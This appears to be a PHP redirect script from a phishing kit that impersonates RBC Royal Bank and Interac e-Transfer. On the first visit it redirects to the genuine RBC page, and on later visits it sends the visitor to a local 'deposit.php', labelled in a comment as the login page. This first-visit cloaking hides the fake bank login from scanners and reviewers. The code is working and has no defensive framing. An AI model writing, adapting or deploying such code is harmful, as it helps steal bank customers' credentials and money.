<?php
declare(strict_types=1);

session_start();

$first_visit_url = 'https://mobile.rbcroyalbank.com/mb/mxweb/rbc/download-an-en.html?platform=AN&lang=EN&ref=https%3A%5C%2F%5C%2Fetransfer.interac.ca%5C%2F&iemt=CAJZWZYX';
$return_url      = 'deposit.php';


/* ---------------- GET UNIQUE PAGE KEY ---------------- */
$pageKey = $_GET['pageKey'] ?? 'default_kerhrhry';
$pageKey = preg_replace('/[^A-Za-z0-9_]/', '', $pageKey);

/* ---------------- CONFIG ---------------- */
$expiry_seconds  = 86400 * 30; // 30 days

/* Cookie name now tied to pageKey */
$cookie_name = "etransfer_first_seen_rbc" . $pageKey;

/* ---------------- VALIDATE EXTERNAL URL ---------------- */
if (empty($first_visit_url) || !filter_var($first_visit_url, FILTER_VALIDATE_URL)) {
    header("Location: $return_url", true, 302);
    exit;
}

/* ---------------- FIRST VISIT ---------------- */
if (!isset($_COOKIE[$cookie_name])) {

    // Set cookie unique to this page key
    setcookie(
        $cookie_name,
        hash('sha256', $_SERVER['HTTP_USER_AGENT'] . ($_SERVER['REMOTE_ADDR'] ?? '')),
        time() + $expiry_seconds,
        '/',
        '',
        isset($_SERVER['HTTPS']),
        true
    );

    // Redirect to external site FIRST time only
    header("Location: $first_visit_url", true, 302);
    exit;
}

/* ---------------- SECOND VISIT → GO TO LOGIN.PHP ---------------- */
header("Location: $return_url", true, 302);
exit;
